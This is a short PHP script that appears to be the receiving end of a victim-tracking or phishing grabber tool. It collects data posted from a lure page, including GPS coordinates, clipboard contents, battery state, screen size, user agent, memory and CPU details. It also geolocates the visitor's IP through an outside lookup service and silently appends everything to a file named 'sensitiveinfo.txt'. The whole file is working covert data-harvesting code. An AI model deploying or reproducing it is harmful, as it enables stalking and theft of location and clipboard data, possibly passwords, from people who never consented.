<?php
 
error_reporting(0);
$networkinfo = $_POST['networkinformation'];
$batterypercentage = $_POST['batterypercentage'];
$ischarging = $_POST['ischarging'];
$width = $_POST['width'];
$height = $_POST['height'];
$platform = $_POST['platform'];
$gps = $_POST['gps'];
$localtime = $_POST['localtime'];
$devicelang = $_POST['devicelang'];
$iscookieEnabled = $_POST['iscookieEnabled'];
$useragent = $_POST['useragent'];
$deviceram = $_POST['deviceram'];
$cpuThreads = $_POST['cpuThreads'];
$referurl = $_POST['referurl'];
$clipboard = $_POST['clipboard'];
$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$ulke = $details->country;
date_default_timezone_set('Europe/Istanbul');
$tarih=date("d-m-Y H:i:s");
$file = fopen('sensitiveinfo.txt', 'a');
fwrite($file, "Ip Address: " .$ip."\n\n".
"Country: ".$ulke ."\n\n"."NetworkInformation: ".$networkinfo."\n\n"."Batterypercentage: ".$batterypercentage."\n\n"."Ischarging: ".$ischarging."\n\n"."ScreenWidth: ".$width."\n\n" ."ScreeHeight: ".$height."\n\n" ."Platform: ".$platform."\n\n" ."GPS: ".$gps."\n\n" ."DeviceLocalTime: ".$localtime."\n\n" ."DeviceLanguage: ".$devicelang."\n\n" ."CookieEnabled: ".$iscookieEnabled."\n\n" ."UserAgent: ".$useragent."\n\n" ."DeviceMemory: ".$deviceram."\n\n" ."CPuThreads: ".$cpuThreads."\n\n" ."Clipboard: ".$clipboard."\n\n"."ReferUrl: ".$referurl."\n\n\n\n");
fclose($file);
?>
